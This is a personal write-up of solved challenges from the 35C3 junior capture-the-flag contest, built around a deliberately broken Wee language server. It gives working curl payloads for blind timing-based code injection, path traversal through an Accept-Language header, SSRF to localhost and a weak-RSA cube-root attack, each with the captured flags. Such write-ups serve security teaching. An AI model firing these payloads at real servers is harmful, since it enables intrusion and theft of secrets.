Wee
===
A lot of the challenges in the junior CTF were based on a modified platform for the Wee programming language, which had been broken in many ways

Wee description
---------------

Good coders should learn one new language every year.

InfoSec folks are even used to learn one new language for every new problem they face (YMMV).

If you have not picked up a new challenge in 2018, you're in for a treat.

We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.

Some cool Projects can be created in Wee, like: [this](https://paperbots.io/project.html?id=URJgCh), [this](https://paperbots.io/project.html?id=kpyyrl) and [that](https://paperbots.io/project.html?id=F53thj).

Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.

Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics [paperbot github](https://github.com/badlogic/paperbots) (mirrored up to this commit [here](https://github.com/domenukk/paperbots/)).

We even added new features to this better server, like server-side Wee evaluation!

To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.


Solved Challenges
=================
Below are the challenges that I personally solved:

Decrypted - 80 points
---------------------

* **Cryptography**

# Problem

Solves: 70

Did you know server-side Wee will supports a variety of crypto operations in the future? How else could Wee ever catch up to other short-named languages like Go or all the Cs? Anyway it's still in testing. If you already want to take it for a spin, try /wee/encryptiontest.

http://35.207.189.79/

Difficulty Estimate: Medium

# Solution

OK, so let's connect to this endpoint and see what it returns:

```bash
$ curl http://35.207.189.79/wee/encryptiontest
```
```json
{"enc":"650802889626540392576254226480769958677174063746262298961949406725587937603370598056914641680440287141866554424868358513810586735136666559905873773370795301824775736764582520414393058823900835653671443326759384479590622850329114068561701339992264327486363426970702107667234446480134526246514585103292832378240690398119481568246551291749012927947948046185733533974179911092159848587\n"}
```
So we have an encrypted ciphertext (numeric). Let's inspect the relevant code (in [server.py](server.py):

```
        record pubkey
            n: string
            e: string
        end

        var key = pubkey('951477056381671188036079180681828396446164466568923964269373812360568216940258578681673755725586138473475522188240856850626984093905399964041687626629414562063470963902807801143023140969208234239276778397171817582591827008690056789763534174119863046106813515750863733543758319811194784246845138921495556311458180478538856550842509692686396679117903040148607642710832573838027274004952072516749168425434697690016707327002989407014753735313730653189661541750880855213165937564578292464379167857778759136474173425831340306919705672933486711939333953750637729967455118475408369751602538202818190663939706886093046526104043062374288648189070207772477271879494000411582080352364098957455090381238978031676375437980396931371164061080967754225429135119036489128165414029872153856547376448552882344531325480944511714482341088742350110097372766748364926941000441524157824859511557342673524388056049358362600925172299990719998873868038194555465008036497932945812845340638853399732721987228486858193979073913761760370769609347622795498987306822413134236749607735657967667902966667996797241364688793919066445360547749193845825298342626288990158730149727398354192053692360716383851051271618559075048012800235250387837052573541157845958948856954035758915157871993646182544696043757263004887914724250286341123038686355398997399922927237477691269351791943572679717263938613148630387793458838416117454016370454288153779764863162055098229903413503857354581027436855574871814478747237999617879024407403954905986969721336803258774514397600947175650242674193496614652267158753817350136305620268076457813070726099248681642612063203170442453405051455877524709366973062774037044772079720703743828695351198984334830532193564525916901461725538418714517302390850049543856542699391339075976843028654004552169277571339017161697013373622770115406681080294994790626557117129820457988045974009530185622113951540819939983153190486345031549722007896699102268137425607039925174692583738394816628508716999668221820730737934785438568198334912127263127241407430459511422030656861043544813130287622862247904749760983465608684778389799703770877931875268858524702991767450720773677639856979930404508755100624844341829896497906824520180051038779126563860453039035779455387733056343833776802716194138072528278142786901904343407377649000988142255369860324110311816186668720584468851089864315465497405748709976389375632079690963423708940060402561050963276766635011726613211018206198125893007608417148033891841809', '3')

        fun encrypt(message: string, key: pubkey): string
            return bigModPow(strToBig(message), key.e, key.n)
        end
```

Notice the ciphertext is a relatively small number as compared to n, as seen in the pubkey. The exponent (3) is also small. Since the plaintext is encrypted RSA-style E = M³ (mod N) and the encrypted text size (probably) has not surpassed the size of N, we can simply compute the third-power root of the ciphertext to get the plaintext.

Googled a python script for computing the kth power root of a number:
```python
def iroot(k, n):
    hi = 1
    while pow(hi, k) < n:
        hi *= 2
    lo = hi / 2
    while hi - lo > 1:
        mid = (lo + hi) // 2
        midToK = pow(mid, k)
        if midToK < n:
            lo = mid
        elif n < midToK:
            hi = mid
        else:
            return mid
    if pow(hi, k) == n:
        return hi
    else:
        return lo
```

```python
iroot(3,650802889626540392576254226480769958677174063746262298961949406725587937603370598056914641680440287141866554424868358513810586735136666559905873773370795301824775736764582520414393058823900835653671443326759384479590622850329114068561701339992264327486363426970702107667234446480134526246514585103292832378240690398119481568246551291749012927947948046185733533974179911092159848587)

8665956223801194705910664403122110405720001050525470730432277700963464398434592579641823005644197683478657391968391208645510483L

'{:x}'.format(8665956223801194705910664403122110405720001050525470730432277700963464398434592579641823005644197683478657391968391208645510483).decode('hex')

'35C3_OUR_CRYPTO_IS_AS_LEGIT_AS_MOST_CRYPTO_CURRENCIES'
```

pretty\_linear - 158 points
---------------------

* **Cryptography**

# Problem

Solves: 28

The NSA gave us these packets, they said it should be just enough to break this crypto.

surveillance.pcap server.py

Difficulty estimate: Medium-Hard

[linear-server.py](linear-server.py)
[linear-surveillance.pcap](linear-surveillance.pcap)

# Solution

TODO

```bash
for stream in `tshark -r linear-surveillance.pcap -T fields -e tcp.stream | sort -n | uniq`; do echo $stream; tshark -r linear-surveillance.pcap -Y usb -z follow,tcp,ascii,$stream >$stream.ascii; done
```

[linear.py](linear.py)


/dev/null - 116 points
----------------------

* **Miscellaneous**

# Problem

Solves: 42

We're not the first but definitely the latest to offer dev-null-as-a-service. Pretty sure we're also the first to offer Wee-piped-to-dev-null-as-a-service[WPtDNaaS]. (We don't pipe anything, but the users don't care). This service is more useful than most blockchains (old joke, we know). Anyway this novel endpoint takes input at /wee/dev/null and returns nothing.

http://35.207.189.79/

Difficulty Estimate: Hard

# Solution

The relevant code (from [server.py](server.py):
```python
@app.route("/wee/dev/null", methods=["POST"])
def dev_null():
    json = request.get_json(force=True)
    wee = json["code"]
    wee = """
    var DEV_NULL: string = '{}'
    {}
    """.format(DEV_NULL, wee)
    _ = runwee(wee)
    return "GONE"
```
The API endpoint will kindly evaluate any given Wee code, but it will not show any output. A variable DEV\_NULL is defined, which holds the flag. In this case we can use an approach similar to time-based blind sql injection: force a binary decision, and pause for some time when the condition holds.
Looking through the Wee language, we see that we can compare single characters (not strings), get a single character from a string, and pause for a number of seconds. This is enough to apply this technique. After some fiddling around, the following request seems to work (we know the flag will start with 35C3, so the first character is a 3):
```bash
curl -v http://35.207.189.79/wee/dev/null -H "Content-Type: application/json" --data '{"code": "if \"3\" == charAt(DEV_NULL,0) then pause(1000) end"}'
```

Now we can create a script that tries all characters this way and measures the response time to find the flag:
[devnull](devnull.py)

After a bit of a wait, the flag falls out:
```
35C3_TH3_SUN_IS_TH3_SAM3_YOU_RE_OLDER
```

Conversion Error - 87 points
----------------------------

* **Miscellaneous**

# Problem

Solves: 63

With assert\_string(str: string), we assert that our VM properly handles conversions. So far we never triggered the assertion and are certain it's impossible.

http://35.207.189.79/

Difficulty estimate: Medium

# Solution

The relevant code (from [weeterpreter.ts](weeterpreter.ts)):
```
    externals.addFunction(
        "assert_conversion",
        [{name: "str", type: compiler.StringType}], compiler.StringType,
        false,
        (str: string) => str.length === +str + "".length || !/^[1-9]+(\.[1-9]+)?$/.test(str)
            ? "Convert to Pastafarianism" : flags.CONVERSION_ERROR
    )
```
Hmm, seems like there is a pattern there that specifically checks for one or more numbers, optinally followed one or more times by a dot and another number. Let's try calling the code with a string matching the pattern (using the /wee/run endpoint) and logging the result:

```bash
curl http://35.207.189.79/wee/run -H "Content-Type: application/json" --data '{"code": "alert(assert_conversion(\"1.1\"))"}'
```
And voila, bingo already:
```json
{"code":"alert(assert_conversion(\"1.1\"))","result":"35C3_FLOATING_POINT_PROBLEMS_I_FEEL_B4D_FOR_YOU_SON\n"}
```
I didn't spend time to figure out exactly why it worked. It might have something to do with floating point approximation.


Equality Error - 88 points
--------------------------

* **Miscellaneous**

# Problem

Solves: 62

At assert\_equals(num: number), we've added an assert to make sure our VM properly handles equality. With only a few basic types, it's impossible to mess this one up, so the assertion has never been triggered. In case you do by accident, please report the output.

http://35.207.189.79/

Difficulty estimate: Medium

# Solution

The relevant code (from [weeterpreter.ts](weeterpreter.ts)):
```
    externals.addFunction(
        "assert_equals",
        [{name: "num", type: compiler.NumberType}], compiler.StringType,
        false,
        (num: number) => num === num
            ? "EQUALITY WORKS" : flags.EQUALITY_ERROR
    )
```
So we have to call the assert\_equals function with something other than a number. Since Wee is statically typed, this is not trivial.
However, we can try to find a function that should return a number, but cannot do that in all instances, such as the sqrt function.
Since a root of a negative number does not exists, it will return NaN (I did not find out to instantiate NaN directly):
```bash
curl http://35.207.189.79/wee/run -H "Content-Type: application/json" --data '{"code": "alert(assert_equals(sqrt(-1)))"}'
```
```json
{"code":"alert(assert_equals(sqrt(-1)))","result":"35C3_NANNAN_NANNAN_NANNAN_NANNAN_BATM4N\n"}
```


Number Error - 80 points
------------------------

* **Miscellaneous**

# Problem

Solves: 71

The function assert\_number(num: number) is merely a debug function for our Wee VM (WeeEm?). It proves additions always work. Just imagine the things that could go wrong if it wouldn't!

http://35.207.189.79/

Difficulty estimate: Easy - Medium

# Solution

The relevant code (from [weeterpreter.ts](weeterpreter.ts)):
```
    externals.addFunction(
        "assert_number",
        [{name: "num", type: compiler.NumberType}], compiler.StringType,
        false,
        (num: number) => !isFinite(num) || isNaN(num) || num !== num + 1
            ? "NUMBERS WORK" : flags.NUMBER_ERROR
    )
```
There are some sanity checks on numbers here. Let's simply try to pass a very small number to start out:
```bash
curl http://35.207.189.79/wee/run -H "Content-Type: application/json" --data '{"code": "alert(assert_number(-1221122341214121212))"}'
```
Oops, already solved:
```json
{"code":"alert(assert_number(-1221122341214121212))","result":"35C3_THE_AMOUNT_OF_INPRECISE_EXCEL_SH33TS\n"}
```


ultra secret - 102 points
-------------------------

* **Miscellaneous**

# Problem

Solves: 50

This flag is protected by a password stored in a highly sohpisticated chain of hashes. Can you capture it nevertheless? We are certain the password consists of lowercase alphanumerical characters only.

nc 35.207.158.95 1337

Source

Difficulty estimate: Easy

# Solution

[ultrasecret.py](ultrasecret.py)
```
(20.685096740722656, '10e004c2e186b4d280fad7f36e779e0 ', b'')
(20.68368148803711, '10e004c2e186b4d280fad7f36e779e1 ', b'')
(20.684008836746216, '10e004c2e186b4d280fad7f36e779e2 ', b'')
(20.684692859649658, '10e004c2e186b4d280fad7f36e779e3 ', b'')
(20.68476915359497, '10e004c2e186b4d280fad7f36e779e4 ', b'')
(20.68247151374817, '10e004c2e186b4d280fad7f36e779e5 ', b'')
(20.684102773666382, '10e004c2e186b4d280fad7f36e779e6 ', b'')
(20.683815956115723, '10e004c2e186b4d280fad7f36e779e7 ', b'')
(20.68332600593567, '10e004c2e186b4d280fad7f36e779e8 ', b'')
(20.683207273483276, '10e004c2e186b4d280fad7f36e779e9 ', b'')
(20.684966325759888, '10e004c2e186b4d280fad7f36e779ea ', b'')
(20.684995651245117, '10e004c2e186b4d280fad7f36e779eb ', b'')
(20.684818267822266, '10e004c2e186b4d280fad7f36e779ec ', b'')
(21.35000514984131, '10e004c2e186b4d280fad7f36e779ed ', b'')
(20.684263706207275, '10e004c2e186b4d280fad7f36e779ee ', b'')
(20.684320211410522, '10e004c2e186b4d280fad7f36e779ef ', b'')
10e004c2e186b4d280fad7f36e779ed
(21.349497079849243, '10e004c2e186b4d280fad7f36e779ed0', b'')
(21.350265741348267, '10e004c2e186b4d280fad7f36e779ed1', b'')
(21.35055160522461, '10e004c2e186b4d280fad7f36e779ed2', b'')
(21.3499972820282, '10e004c2e186b4d280fad7f36e779ed3', b'')
(21.349507331848145, '10e004c2e186b4d280fad7f36e779ed4', b'35C3_timing_attacks_are_fun!_:)\n')
(21.35212254524231, '10e004c2e186b4d280fad7f36e779ed5', b'')
(21.352282762527466, '10e004c2e186b4d280fad7f36e779ed6', b'')
(21.350053548812866, '10e004c2e186b4d280fad7f36e779ed7', b'')
(21.352192640304565, '10e004c2e186b4d280fad7f36e779ed8', b'')
(21.350988149642944, '10e004c2e186b4d280fad7f36e779ed9', b'')
(21.35246443748474, '10e004c2e186b4d280fad7f36e779eda', b'')
(21.35115146636963, '10e004c2e186b4d280fad7f36e779edb', b'')
(21.350448608398438, '10e004c2e186b4d280fad7f36e779edc', b'')
(21.3508939743042, '10e004c2e186b4d280fad7f36e779edd', b'')
(21.35137104988098, '10e004c2e186b4d280fad7f36e779ede', b'')
(21.353375911712646, '10e004c2e186b4d280fad7f36e779edf', b'')
```


Wee R Leet - 75 points
----------------------

* **Miscellaneous**

# Problem

Solves: 78

Somebody forgot a useless assert function in the interpreter somewhere. In our agile development lifecycle somebody added the function early on to prove it's possible. Wev've only heared stories but apparently you can trigger it from Wee and it behaves differently for some "leet" input(?) What a joker. We will address this issue over the next few sprints. Hopefully it doesn't do any harm in the meantime.

http://35.207.189.79/

Difficulty estimate: Easy

# Solution

```bash
curl http://35.207.189.79/wee/run -H "Content-Type: application/json" --data '{"code": "alert(assert_leet(4919))"}'
```
```json
{"code":"alert(assert_leet(4919))","result":"35C3_HELLO_WEE_LI77LE_WORLD\n"}
```


Wee Token - 97 points
---------------------

* **Miscellaneous**

# Problem

Solves: 54

We _need_ to make sure strings in Wee are also strings in our runtime. Apparently attackers got around this and actively exploit us! We do not know how. Calling out to haxxor1, brocrowd, kobold.io,...: if anybody can show us how they did it, please, please please submit us the token the VM will produce. We added the function assert_string(str: string) for your convenience. You might get rich - or not. It depends a bit on how we feel like and if you reach our technical support or just 1st level. Anyway: this is a call to arms and a desperate request, that, we think, is usually called Bugs-Bunny-Program... or something? Happy hacking.

http://35.207.189.79/

Difficulty estimate: Easy

# Solution

```bash
curl http://35.207.189.79/wee/run -H "Content-Type: application/json" --data '{"code": "alert(assert_string(eval(\"\")))"}'
```
```json
{"code":"alert(assert_string(eval(\"\")))","result":"35C3_WEE_IS_TINY_AND_SO_CONFU5ED\n"}
```


DB Secret - 89 points
---------------------

* **Web**

# Problem

Solves: 61

To enable secure microservices (or whatever, we don't know yet) over Wee in the future, we created a specific DB_SECRET, only known to us. This token is super important and extremely secret, hence the name. The only way an attacker could get hold of it is to serve good booze to the admins. Pretty sure it's otherwise well protected on our secure server.

http://35.207.189.79/

Difficulty Estimate: Medium

# Solution

```bash
./db_secret.py
```
```json
{'code': 1, 'content': 1, 'created': 1, 'lastModified': 1, 'public': 1, 'title': 1, 'type': 1, 'userName': '35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???'}
```


flags - 37 points
-----------------

* **Web**

# Problem

Solves: 411

Fun with flags: http://35.207.169.47

Flag is at /flag

Difficulty estimate: Easy

# Solution

[flags](flags.png)

```bash
curl -H 'Accept-Language: ....//....//....//....//flag' http://35.207.169.47/
```
```html
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />&nbsp;&nbsp;highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">[</span><span style="color: #DD0000">'HTTP_ACCEPT_LANGUAGE'</span><span style="color: #007700">]&nbsp;??&nbsp;</span><span style="color: #DD0000">'ot'</span><span style="color: #007700">;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">explode</span><span style="color: #007700">(</span><span style="color: #DD0000">','</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$lang</span><span style="color: #007700">)[</span><span style="color: #0000BB">0</span><span style="color: #007700">];<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">'../'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">''</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$lang</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">"flags/</span><span style="color: #0000BB">$lang</span><span style="color: #DD0000">"</span><span style="color: #007700">);<br />&nbsp;&nbsp;if&nbsp;(!</span><span style="color: #0000BB">$c</span><span style="color: #007700">)&nbsp;</span><span style="color: #0000BB">$c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">"flags/ot"</span><span style="color: #007700">);<br />&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">'&lt;img&nbsp;src="data:image/jpeg;base64,'&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">base64_encode</span><span style="color: #007700">(</span><span style="color: #0000BB">$c</span><span style="color: #007700">)&nbsp;.&nbsp;</span><span style="color: #DD0000">'"&gt;'</span><span style="color: #007700">;<br /><br /></span>
</span>
</code><img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">
```
```bash
echo 'MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo' | base64 -d
35c3_this_flag_is_the_be5t_fl4g
```


localhost - 81 points
---------------------

* **Web**

# Problem

Solves: 69

We came up with some ingenious solutions to the problem of password reuse. For users, we don't use password auth but send around mails instead. This works well for humans but not for robots. To make test automation possible, we didn't want to send those mails all the time, so instead we introduced the localhost header. If we send a request to our server from the same host, our state-of-the-art python server sets the localhost header to a secret only known to the server. This is bullet-proof, luckily.

http://35.207.189.79/

Difficulty Estimate: Medium

# Solution

```
curl -v http://35.207.189.79/favicon.ico
*   Trying 35.207.189.79...
* TCP_NODELAY set
* Connected to 35.207.189.79 (35.207.189.79) port 80 (#0)
> GET /favicon.ico HTTP/1.1
> Host: 35.207.189.79
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.13.12
< Content-Type: image/vnd.microsoft.icon
< Content-Length: 1150
< Connection: keep-alive
< Last-Modified: Thu, 27 Dec 2018 13:56:51 GMT
< Cache-Control: public, max-age=43200
< Expires: Sun, 30 Dec 2018 23:41:37 GMT
< ETag: "1545919011.0-1150-704843451"
< Date: Sun, 30 Dec 2018 11:41:37 GMT
< Accept-Ranges: bytes
< X-Frame-Options: SAMEORIGIN
< X-Xss-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< Content-Security-Policy: script-src 'self' 'unsafe-inline';
< Referrer-Policy: no-referrer-when-downgrade
< Feature-Policy: geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; fullscreen *; payment 'self';
< 
```

```
curl -v 'http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/favicon.ico'
*   Trying 35.207.189.79...
* TCP_NODELAY set
* Connected to 35.207.189.79 (35.207.189.79) port 80 (#0)
> GET /api/proxyimage?url=http://127.0.0.1:8075/favicon.ico HTTP/1.1
> Host: 35.207.189.79
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: image/vnd.microsoft.icon
< Content-Length: 1150
< Connection: keep-alive
< Server: nginx/1.13.12
< Last-Modified: Thu, 27 Dec 2018 13:56:51 GMT
< Cache-Control: public, max-age=43200
< Expires: Sun, 30 Dec 2018 23:42:55 GMT
< ETag: "1545919011.0-1150-704843451"
< Date: Sun, 30 Dec 2018 11:42:55 GMT
< Accept-Ranges: bytes
< X-Frame-Options: SAMEORIGIN
< X-Xss-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< Content-Security-Policy: script-src 'self' 'unsafe-inline';
< Referrer-Policy: no-referrer-when-downgrade
< Feature-Policy: geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; fullscreen *; payment 'self';
< X-Localhost-Token: 35C3_THIS_HOST_IS_YOUR_HOST_THIS_HOST_IS_LOCAL_HOST
< 
```



Logged In - 47 points
---------------------

* **Web**

# Problem

Solves: 180

Phew, we totally did not set up our mail server yet. This is bad news since nobody can get into their accounts at the moment... It'll be in our next sprint. Until then, since you cannot login: enjoy our totally finished software without account.

http://35.207.189.79/

Difficulty Estimate: Easy

# Solution

```
./logged_in.py
<RequestsCookieJar[<Cookie logged_in=35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS for 13.37.13.37/>, <Cookie name=admin for 13.37.13.37/>, <Cookie token=cyutmcaczwlbdxzxcgujpwxekhyctlff for 13.37.13.37/>]>
```


McDonald - 44 points
--------------------

* **Web**

# Problem

Solves: 214

Our web admin name's "Mc Donald" and he likes apples and always forgets to throw away his apple cores..

http://35.207.91.38

# Solution

ds-store package

[mcdonald.py](mcdonald.py)

probably could have walked the directory tree by hand, but i just like programming too much...
```
(venv2) root@kali:~/share/ds# python mcdonald.py 
('no match: ', u'http://35.207.91.38/backup/a')
('no match: ', u'http://35.207.91.38/backup/c/a')
('no match: ', u'http://35.207.91.38/backup/c/c/a')
('no match: ', u'http://35.207.91.38/backup/c/c/c')
('no match: ', u'http://35.207.91.38/backup/c/c/b')
('no match: ', u'http://35.207.91.38/backup/c/b/a')
('no match: ', u'http://35.207.91.38/backup/c/b/c')
('no match: ', u'http://35.207.91.38/backup/c/b/b')
('no match: ', u'http://35.207.91.38/backup/b/a/a')
('no match: ', u'http://35.207.91.38/backup/b/a/c/flag.txt')
('no match: ', u'http://35.207.91.38/backup/b/a/c/noflag.txt')
('no match: ', u'http://35.207.91.38/backup/b/a/b/fun')
('no match: ', u'http://35.207.91.38/backup/b/a/noflag.txt')
('no match: ', u'http://35.207.91.38/backup/b/c')
('no match: ', u'http://35.207.91.38/backup/b/b/fun')
('no match: ', u'http://35.207.91.38/backup/b/noflag.txt')
(venv2) root@kali:~/share/ds# curl http://35.207.91.38/backup/b/a/c/flag.txt
35c3_Appl3s_H1dden_F1l3s
```


Not(e) accessible - 55 points
-----------------------------

* **Web**

# Problem

Solves: 130

We love notes. They make our lifes more structured and easier to manage! In 2018 everything has to be digital, and that's why we built our very own note-taking system using micro services: Not(e) accessible! For security reasons, we generate a random note ID and password for each note.

Recently, we received a report through our responsible disclosure program which claimed that our access control is bypassable...

http://35.207.120.163

Difficulti estimate: Easy-Medium

# Solution

[note1.png](note1.png)
[note2.png](note2.png)
[note3.png](note3.png)
[note4.png](note4.png)
[note5.png](note5.png)
